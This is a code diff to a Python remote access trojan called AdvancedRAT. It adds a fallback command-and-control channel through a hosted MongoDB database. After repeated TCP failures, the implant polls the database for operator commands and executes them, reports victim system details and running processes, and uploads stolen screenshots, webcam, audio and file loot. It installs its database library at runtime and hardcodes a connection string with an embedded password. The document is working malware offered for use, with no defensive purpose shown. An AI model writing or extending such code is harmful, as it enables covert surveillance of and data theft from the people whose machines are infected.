@@ -2212,6 +2212,8 @@ class AdvancedRAT:
         self.client_id = self.profiler.generate_fingerprint()
         self.current_server_index = 0
         self.retry_count = 0
+        self.mongo_mode = False
+        self.mongodb_client = None
         self.command_handlers = self._setup_command_handlers()
         
         self.phishing = PhishingManager(self)
@@ -2415,6 +2417,58 @@ class AdvancedRAT:
     
     def _send_encrypted(self, data):
         """Send encrypted data to C2 with robust locking and error handling"""
+        import datetime
+        import json
+        if getattr(self, 'mongo_mode', False):
+            try:
+                m_type = data.get('type')
+                if m_type == 'result':
+                    cmd_id = data.get('id')
+                    result_val = data.get('data')
+                    if hasattr(self, 'mongodb_client'):
+                        db = self.mongodb_client.get_database('c2_database')
+                        db.commands.update_one(
+                            {"id": cmd_id},
+                            {"$set": {
+                                "status": "completed",
+                                "result": json.dumps(result_val),
+                                "is_active": 0,
+                                "updated_at": datetime.datetime.now().isoformat()
+                            }}
+                        )
+                elif m_type == 'error':
+                    cmd_id = data.get('command_id')
+                    err_val = data.get('error')
+                    if hasattr(self, 'mongodb_client'):
+                        db = self.mongodb_client.get_database('c2_database')
+                        db.commands.update_one(
+                            {"id": cmd_id},
+                            {"$set": {
+                                "status": "failed",
+                                "error_message": str(err_val),
+                                "is_active": 0,
+                                "updated_at": datetime.datetime.now().isoformat()
+                            }}
+                        )
+                elif m_type == 'status_update':
+                    cmd_id = data.get('command_id') or data.get('id')
+                    status = data.get('status')
+                    is_active = data.get('is_active', 0)
+                    if hasattr(self, 'mongodb_client'):
+                        db = self.mongodb_client.get_database('c2_database')
+                        db.commands.update_one(
+                            {"id": cmd_id},
+                            {"$set": {
+                                "status": status,
+                                "is_active": is_active,
+                                "updated_at": datetime.datetime.now().isoformat()
+                            }}
+                        )
+                return True
+            except Exception as e:
+                self.logger.error(f"MongoDB _send_encrypted error: {e}")
+                return False
+
         if not self.sock:
             return False
         
@@ -2450,6 +2504,26 @@ class AdvancedRAT:
 
     def _send_loot(self, loot_type, data, filename=None):
         """Send loot (screenshot/webcam/audio/files) to C2"""
+        if getattr(self, 'mongo_mode', False):
+            try:
+                import datetime
+                self.logger.info(f"Saving {loot_type} loot to MongoDB...")
+                if hasattr(self, 'mongodb_client'):
+                    db = self.mongodb_client.get_database('c2_database')
+                    ts = datetime.datetime.now().isoformat()
+                    db.loot.insert_one({
+                        "client_id": self.client_id,
+                        "type": loot_type,
+                        "filename": filename or f"unnamed_{int(time.time())}",
+                        "data": data,
+                        "timestamp": ts,
+                        "size": len(data) if data else 0
+                    })
+                return True
+            except Exception as e:
+                self.logger.error(f"MongoDB _send_loot error: {e}")
+                return False
+
         if not self.connected or not self.sock:
             return False
             
@@ -2717,6 +2791,189 @@ class AdvancedRAT:
                         return found_ip
         return None
 
+    def _ensure_pymongo(self):
+        try:
+            import pymongo
+            from pymongo.server_api import ServerApi
+        except ImportError:
+            import subprocess
+            import sys
+            self.logger.info("Installing pymongo & dnspython dynamically...")
+            try:
+                subprocess.check_call([sys.executable, "-m", "pip", "install", "pymongo", "dnspython"])
+                import pymongo
+                from pymongo.server_api import ServerApi
+            except Exception as e:
+                self.logger.error(f"Failed to install pymongo: {e}")
+                raise e
+
+    def _load_dotenv(self):
+        import os
+        from pathlib import Path
+        for path in [Path('.'), Path('..'), Path(__file__).parent]:
+            env_path = path / '.env'
+            if env_path.exists():
+                try:
+                    with open(env_path) as f:
+                        for line in f:
+                            line = line.strip()
+                            if line and not line.startswith('#') and '=' in line:
+                                k, _, v = line.partition('=')
+                                k = k.strip()
+                                v = v.strip().strip('"').strip("'")
+                                if k and k not in os.environ:
+                                    os.environ[k] = v
+                    break
+                except Exception as e:
+                    self.logger.warning(f"Error loading .env file: {e}")
+
+    def _mongodb_loop(self):
+        """Poll MongoDB for commands and send heartbeats"""
+        import time
+        import datetime
+        import json
+        import os
+        import re
+        from urllib.parse import quote_plus
+
+        def _safe_mongo_uri(uri):
+            """URL-encode username and password in a MongoDB URI (RFC 3986)."""
+            m = re.match(r'^(mongodb(?:\+srv)?://)([^:@]+):([^@]+)@(.+)$', uri)
+            if m:
+                scheme, user, password, rest = m.groups()
+                return f"{scheme}{quote_plus(user)}:{quote_plus(password)}@{rest}"
+            return uri
+        
+        self.logger.info("Connecting to MongoDB Atlas...")
+        try:
+            self._ensure_pymongo()
+            from pymongo import MongoClient
+            from pymongo.server_api import ServerApi
+            
+            self._load_dotenv()
+            mongodb_uri = os.environ.get('MONGODB_URI')
+            if not mongodb_uri:
+                mongodb_uri = "mongodb+srv://manankamboj66_db_user:eABZd3jiAZmOfuNx@c2db-cluster.tag4k0q.mongodb.net/?appName=C2db-cluster"
+            
+            mongodb_uri = _safe_mongo_uri(mongodb_uri)
+            self.logger.info(f"Connecting to MongoDB with URI: {mongodb_uri[:35]}...")
+            client = MongoClient(mongodb_uri, server_api=ServerApi('1'))
+            self.mongodb_client = client
+            db = client.get_database('c2_database')
+            self.logger.success("Connected to MongoDB via Atlas (Hybrid Mode)")
+
+        except Exception as e:
+            self.logger.error(f"MongoDB connection failed: {e}")
+            time.sleep(10)
+            return
+
+        last_heartbeat = 0
+        
+        while self.running and getattr(self, 'mongo_mode', False):
+            try:
+                now = time.time()
+                ts = datetime.datetime.now().isoformat()
+                
+                # 1. Heartbeat (Every 30 seconds)
+                if now - last_heartbeat > 30:
+                    last_heartbeat = now
+                    try:
+                        sys_info = self.profiler.get_system_info()
+                        metrics = self.profiler.get_metrics()
+                    except Exception as e:
+                        sys_info = {"error": str(e)}
+                        metrics = {}
+                        
+                    client_data = {
+                        "id": self.client_id,
+                        "ip_address": "127.0.0.1",
+                        "hostname": sys_info.get('hostname'),
+                        "os": sys_info.get('os'),
+                        "username": sys_info.get('username'),
+                        "gpu": sys_info.get('gpu'),
+                        "motherboard": sys_info.get('motherboard'),
+                        "status": "online",
+                        "last_seen": ts,
+                        "is_admin": sys_info.get('is_admin', 0)
+                    }
+                    db.clients.update_one({"id": self.client_id}, {"$set": client_data}, upsert=True)
+                    
+                    metrics_doc = {
+                        "client_id": self.client_id,
+                        "cpu_usage": metrics.get('cpu_usage', 0),
+                        "memory_usage": metrics.get('memory_usage', 0),
+                        "memory_total": metrics.get('memory_total', 0),
+                        "disk_usage": metrics.get('disk_usage', 0),
+                        "disk_total": metrics.get('disk_total', 0),
+                        "network_in": metrics.get('network_in', 0),
+                        "network_out": metrics.get('network_out', 0),
+                        "network_interfaces": json.dumps(metrics.get('network_interfaces', {})),
+                        "running_processes": json.dumps(metrics.get('running_processes', [])),
+                        "network_connections": str(metrics.get('network_connections', 0)),
+                        "uptime": metrics.get('uptime', 0),
+                        "timestamp": ts
+                    }
+                    db.system_info.insert_one(metrics_doc)
+                    self.logger.info("Sent MongoDB heartbeat and metrics.")
+
+                # 2. Check for pending commands targeting this client
+                query = {
+                    "client_id": self.client_id,
+                    "status": "pending"
+                }
+                pending_cmds = list(db.commands.find(query).sort("created_at", 1))
+                
+                for cmd in pending_cmds:
+                    cmd_id = cmd.get('id')
+                    cmd_type = cmd.get('command_name') or cmd.get('command_type', '')
+                    params_str = cmd.get('parameters', '{}')
+                    try:
+                        params = json.loads(params_str)
+                    except:
+                        params = params_str if isinstance(params_str, dict) else {}
+                    
+                    self.logger.info(f"MongoDB Command Received: {cmd_type} (ID: {cmd_id})")
+                    
+                    # Update status to executing
+                    db.commands.update_one(
+                        {"id": cmd_id},
+                        {"$set": {
+                            "status": "executing",
+                            "is_active": 1,
+                            "updated_at": datetime.datetime.now().isoformat()
+                        }}
+                    )
+                    
+                    # Run the command
+                    if cmd_type in self.command_handlers:
+                        handler = self.command_handlers[cmd_type]
+                        cmd_payload = {
+                            'id': cmd_id,
+                            'type': cmd_type,
+                            'params': params
+                        }
+                        threading.Thread(
+                            target=self._execute_command,
+                            args=(handler, cmd_payload, cmd_id),
+                            daemon=True
+                        ).start()
+                    else:
+                        # Report unsupported command
+                        db.commands.update_one(
+                            {"id": cmd_id},
+                            {"$set": {
+                                "status": "failed",
+                                "error_message": f"Unsupported command type: {cmd_type}",
+                                "is_active": 0,
+                                "updated_at": datetime.datetime.now().isoformat()
+                            }}
+                        )
+                
+                time.sleep(2)
+            except Exception as e:
+                self.logger.error(f"Error in MongoDB poll iteration: {e}")
+                time.sleep(5)
+
     def _connection_loop(self):
         """Main connection loop with auto-discovery and smart fallback rotation"""
         last_discovery_time = 0
@@ -2826,6 +3083,16 @@ class AdvancedRAT:
                 # Rotate servers
                 self.current_server_index = (self.current_server_index + 1) % len(C2_SERVERS)
                 self.retry_count += 1
+                if self.retry_count >= 10:
+                    self.logger.warning("Failed to connect via TCP 10 times. Switching to MongoDB Hybrid Mode...")
+                    self.mongo_mode = True
+                    try:
+                        self._mongodb_loop()
+                    except Exception as ex:
+                        self.logger.error(f"Error in MongoDB Loop: {ex}")
+                    finally:
+                        self.mongo_mode = False
+                        self.retry_count = 0
             
             # mandatory sleep before next attempt
             # If we have multiple servers, try them faster. If only one, wait 5s.
